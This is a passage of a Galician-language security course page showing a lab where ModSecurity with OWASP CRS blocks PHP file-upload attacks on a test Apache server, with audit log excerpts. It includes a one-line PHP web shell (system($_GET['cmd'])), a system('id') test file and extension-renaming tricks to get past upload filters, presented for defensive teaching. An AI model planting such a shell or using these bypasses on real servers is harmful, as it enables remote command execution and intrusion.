              <li>a2enmod security2 <span class='explicacion'>#Habilitar o módulo security2 que permite activar a configuración do WAF ModSecurity</span></li>
              <li>/etc/init.d/apache2 restart <span class='explicacion'> #Reiniciar o servidor web Apache.</span></li>
              <li>tail -f /var/log/apache2/modsec_audit.log <span class='explicacion'> #Deixar aberto o ficheiro /var/log/apache2/modsec_audit.log para lectura, comenzando a ver polas 10 últimas liñas.</span></li>
            </ul>
          </div>
          <ol type="a" class='mleftsubs mtopsubsmini'>
            <li><p><i><span class='BookmarkTitle-Level-5'>Example 1</span></i> ➝ <br />
              <p><code>http://192.168.120.100/upload/example1.php</code> ➝ <span class='red'> Dende a máquina virtual Kali:</span>
                <ol type='i' class='red'>
                  <li>Crear o arquivo <i>/tmp/file.php</i>
                    <pre class='arribasubs'>
                    &lt;?php
                      system('id');
                    ?&gt;
                    </pre>
                  </li>
                  <li>Subir o arquivo file.php:
                  ➝ Premer na ligazón ➝ <b><code>http://192.168.120.100/upload/images/file.php</code> ➝ O ataque non ten éxito ➝ ModSecurity ➝ OWASP_CRS ➝ Erro 403 </span></p></p>
                </ol>
             <div class='explicacion3' style='margin-left:-60px;'>
               <ul>
                 Agora non se pode subir o ficheiro file.php. Isto é debido a que agora está activado o módulo security2 (modsecurity). De feito, revisando os logs (/var/log/apache2/modsec_audit.log) atopamos que una regra de OWASP (OWASP_CRS/3.3.2) detecta o intento de subida dun ficheiro php na sección H:</b></p>
                 <pre style='white-space: pre-wrap;'>
--d5eb2d28-H--
Message: Warning. Pattern match ".*\\.(?:php\\d*|phtml)\\.*$" at FILES:image. [file "/usr/share/modsecurity-crs/rules/REQUEST-933-APPLICATION-ATTACK-PHP.conf"] [line "107"] [id "933110"] [msg "PHP Injection Attack: PHP Script File Upload Found"] [data "Matched Data: file.php found within FILES:image: file.php"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.2"] [tag "application-multi"] [tag "language-php"] [tag "platform-multi"] [tag "attack-injection-php"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/152/242"]
Message: Access denied with code 403 (phase 2). Operator GE matched 5 at TX:anomaly_score. [file "/usr/share/modsecurity-crs/rules/REQUEST-949-BLOCKING-EVALUATION.conf"] [line "93"] [id "949110"] [msg "Inbound Anomaly Score Exceeded (Total Score: 8)"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.2"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-generic"]
                 </pre>
                 <p class='mleftsubs mtopsubs arribasubsmini'><b>Entón envíase ao cliente a mensaxe pertencente ao código 403(Forbidden) ➝ Acceso denegado.</b></p><br />
                 ➝ [id "933110"] [msg "PHP Injection Attack: PHP Script File Upload Found"] [data "Matched Data: file.php found within FILES:image: file.php"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.2"]
<br />
                 ➝ Message: Access denied with code 403 (phase 2).</p>
               </ul>
             </div>

            </li>
            <li><p><i><span class='BookmarkTitle-Level-5'>Example 2</span></i> ➝ <br />
              <p><code>http://192.168.120.100/upload/example2.php</code><br /> ➝ <span class='red'> Dende a máquina virtual Kali:</span>
                <ol type='i' class='red'>
                  <li>Crear o arquivo <i>/tmp/file.php</i>
                    <pre class='arribasubs'>
                    &lt;?php
                      system('id');
                    ?&gt;
                    </pre>
                  </li>
                  <li>Subir o arquivo file.php:
                  ➝ Premer na ligazón ➝ <b><code>http://192.168.120.100/upload/images/file.php</code></b> ➝ Erro: NO PHP
                  <li class='mtopplus'>Renomear ficheiro file.php a file.php3 
                  <li class='mtopplus'>Subir file.php3 ➝ Premer na ligazón ➝ <b><code>http://192.168.120.100/upload/images/file.php3</code> ➝ O ataque non ten éxito ➝ ModSecurity ➝ OWASP_CRS ➝ Erro 403 </span></p></p>
                </ol>
             <div class='explicacion3 negro' style='margin-left:-60px;'>
               <ul>
                 Agora non se pode subir o ficheiro file.php3. Isto é debido a que agora está activado o módulo security2 (modsecurity). De feito, revisando os logs (/var/log/apache2/modsec_audit.log) atopamos que una regra de OWASP (OWASP_CRS/3.3.2) detecta o intento de subida dun ficheiro php na sección H:</b></p>
                 <pre class='mtopsubs' style='white-space: pre-wrap;mtopsubs'>
--d5eb2d28-H--
Message: Warning. Pattern match ".*\\.(?:php\\d*|phtml)\\.*$" at FILES:image. [file "/usr/share/modsecurity-crs/rules/REQUEST-933-APPLICATION-ATTACK-PHP.conf"] [line "107"] [id "933110"] [msg "PHP Injection Attack: PHP Script File Upload Found"] [data "Matched Data: file.php3 found within FILES:image: file.php3"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.2"] [tag "application-multi"] [tag "language-php"] [tag "platform-multi"] [tag "attack-injection-php"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/152/242"]
Message: Access denied with code 403 (phase 2). Operator GE matched 5 at TX:anomaly_score. [file "/usr/share/modsecurity-crs/rules/REQUEST-949-BLOCKING-EVALUATION.conf"] [line "93"] [id "949110"] [msg "Inbound Anomaly Score Exceeded (Total Score: 8)"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.2"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-generic"]
                 </pre>
                 <p class='mleftsubs mtopsubs arribasubsmini'><b>Entón envíase ao cliente a mensaxe pertencente ao código 403(Forbidden) ➝ Acceso denegado.</b></p><br />
                 ➝ [id "933110"] [msg "PHP Injection Attack: PHP Script File Upload Found"] [data "Matched Data: file.php3 found within FILES:image: file.php3"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.2"]
<br />
                 ➝ Message: Access denied with code 403 (phase 2).</p>
               </ul>
             </div>

             </ol>
             <ol type='i' class='red' start='5'>
                  <li class='mtopplus'><span class='red'>Copiar file.php3 a file.phps ➝ Subir file.phps ➝ Premer na ligazón ➝ <b><code>http://192.168.120.100/upload/images/file.phps</code> ➝ O ataque xa non tiña éxito, dependía da configuración do servidor web e non de modsecurity pero aínda así podemos ver logs en ModSecurity</span></p></p>
             </ol>
             <div class='explicacion3'>
               <ul>
                 Revisando os logs (/var/log/apache2/modsec_audit.log) atopamos que se detecta o intento de execución dun ficheiro php3 e a configuración do propio servidor web non o permite (sección H):</b></p>
                 <pre style='white-space: pre-wrap;'>
--6ca39b07-H--
Apache-Error: [file "mod_authz_core.c"] [line 879] [level 3] AH01630: client denied by server configuration: /var/www/html/upload/images/file.phps
Stopwatch: 1642949908237661 4006 (- - -)
Stopwatch2: 1642949908237661 4006; combined=2793, p1=1582, p2=0, p3=202, p4=593, p5=414, sr=259, sw=2, l=0, gc=0
Response-Body-Transformed: Dechunked
Producer: ModSecurity for Apache/2.9.5 (http://www.modsecurity.org/); OWASP_CRS/3.3.2.
Server: Apache/2.4.43 (Debian)
Engine-Mode: "ENABLED"
                 </pre>
               </ul>
             </div>
             <ol type='i' class='red' start='6'>
                  <li class='mtopplus'><span class='red'>Copiar file.php3 a file.phtml ➝ Subir file.phtml ➝ Premer na ligazón ➝ <b><code>http://192.168.120.100/upload/images/file.phtml</code> ➝ O ataque non ten éxito ➝ ModSecurity ➝ OWASP_CRS ➝ Erro 403 </span></p></p>
             </ol>
             <div class='explicacion3'>
               <ul>
                 Agora non se pode subir o ficheiro file.phtml. Isto é debido a que agora está activado o módulo security2 (modsecurity). De feito, revisando os logs (/var/log/apache2/modsec_audit.log) atopamos que una regra de OWASP (OWASP_CRS/3.3.2) detecta o intento de subida dun ficheiro php na sección H:</b></p>
                 <pre style='white-space: pre-wrap;'>
--e0812044-H--
Message: Warning. Pattern match ".*\\.(?:php\\d*|phtml)\\.*$" at FILES:image. [file "/usr/share/modsecurity-crs/rules/REQUEST-933-APPLICATION-ATTACK-PHP.conf"] [line "107"] [id "933110"] [msg "PHP Injection Attack: PHP Script File Upload Found"] [data "Matched Data: file.phtml found within FILES:image: file.phtml"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.2"] [tag "application-multi"] [tag "language-php"] [tag "platform-multi"] [tag "attack-injection-php"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/152/242"]
Message: Access denied with code 403 (phase 2). Operator GE matched 5 at TX:anomaly_score. [file "/usr/share/modsecurity-crs/rules/REQUEST-949-BLOCKING-EVALUATION.conf"] [line "93"] [id "949110"] [msg "Inbound Anomaly Score Exceeded (Total Score: 8)"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.2"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-generic"]                 
                 </pre>
                 <p class='mleftsubs'><b>Entón envíase ao cliente a mensaxe pertencente ao código 403(Forbidden) ➝ Acceso denegado.</b></p>
                 ➝ [id "933110"] [msg "PHP Injection Attack: PHP Script File Upload Found"] [data "Matched Data: file.phtml found within FILES:image: file.phtml"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.2"] [tag "application-multi"] [tag "language-php"] [tag "platform-multi"] [tag "attack-injection-php"] [tag "paranoia-level/1"] [tag "OWASP_CRS"] [tag "capec/1000/152/242"]
<br />
                 ➝ Message: Access denied with code 403 (phase 2).</p>
               </ul>
             </div>
             <br />
 
             <ol type='i' class='red' start='7'>
             <li class='red'>Crear o arquivo <i>/tmp/file2.php3</i>
                    <pre class='arribasubs'>
                    &lt;?php
                      system($_GET['cmd']);
                    ?&gt;
                    </pre>
                  </li>
                  <li class='mtopplus'>Subir o arquivo file2.php3 ➝ <b>O ataque non ten éxito ➝ ModSecurity ➝ OWASP_CRS ➝ Erro 403 <i>(ver File Upload ➝ Exemplo2 ➝ apartado b.iv)</i></b>
                </ol>
              </p>
            </li>
          </ol>
        </ol>

    </div>
        <div class='mtopplusx4'>&nbsp;</div>
        <div class='mtopplusx2'>&nbsp;</div>
    <hr />
  <div id="footer">
    <div class="nome">Ricardo Feijoo Costa</div>
    <div class='.imgccbysa arriba'>
      <a rel="license" href="http://creativecommons.org/licenses/by-sa/4.0/"><img alt="Creative Commons License" src="images/88x31.png" /></a><br />This work is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by-sa/4.0/">Creative Commons Attribution-ShareAlike 4.0 International License</a>
    </div>
  </div>
</body>
</html>
